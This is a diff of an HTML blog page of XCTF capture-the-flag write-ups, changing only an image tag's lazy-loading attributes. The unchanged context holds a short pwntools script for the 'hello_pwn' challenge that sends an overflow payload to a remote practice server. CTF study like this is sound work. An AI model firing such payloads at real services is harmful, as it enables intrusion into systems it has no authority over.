@@ -421,7 +421,7 @@
 <h3 id="get-shell-XCTF">get_shell - - XCTF</h3>
 <hr>
 <p>芜湖，啦啦啦啦啦~</p>
-<p><img src="https://i.loli.net/2020/08/11/wTrYEFWOPo62JZN.png" class="lazyload" data-srcset="https://i.loli.net/2020/08/11/wTrYEFWOPo62JZN.png" srcset="data:image/png;base64,666" alt="image-20200811223317436"></p>
+<p><img src="https://i.loli.net/2020/08/11/wTrYEFWOPo62JZN.png" alt="image-20200811223317436"></p>
 <h3 id="hello-pwn-XCTF">hello_pwn - - XCTF</h3>
 <hr>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="string">&quot;53289&quot;</span>)</span><br><span class="line">payload = <span class="number">4</span>*<span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x6E756161</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
